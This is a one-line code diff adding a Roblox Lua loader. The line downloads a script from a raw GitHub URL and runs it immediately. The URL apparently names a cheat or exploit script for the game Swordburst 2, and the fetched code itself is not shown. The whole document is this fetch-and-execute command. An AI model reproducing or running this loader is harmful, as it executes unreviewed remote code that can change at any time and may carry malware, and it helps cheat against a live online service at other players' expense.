@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/wave-defense-swordburst-2-spam5-lbu16v2rgy652b.lua"))()
